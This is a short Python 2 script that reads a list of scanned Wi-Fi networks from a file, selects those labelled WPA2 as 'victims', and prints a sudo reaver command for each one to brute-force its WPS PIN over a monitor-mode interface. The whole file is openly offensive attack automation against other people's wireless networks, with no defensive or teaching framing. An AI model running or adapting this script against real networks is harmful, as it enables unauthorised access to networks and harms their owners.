
#!/bin/python
# Fuck it !!

#imports
import os

#set interface

INTERFACE = 'wlan1mon'


def DETECT_MECHANISM(line,type):
	try:
		line.index(type)
		return True
	except ValueError:
		return False

##############################

def FIND_VICTM(type):

	arquivo = open('redes.hack') 

	while True: 
		line =  arquivo.readline()
		#print line
		if line == '':
			break
		if DETECT_MECHANISM(line,type) :
			PIN_ATTACK(line)

##############################

def PIN_ATTACK(line):
	crack = 'sudo reaver -i ' + INTERFACE +  ' -b '  + line[0:18] + ' -vv'
	print crack


	
###########################	
#          MAIN      	  #
###########################	




FIND_VICTM('WPA2') 

	
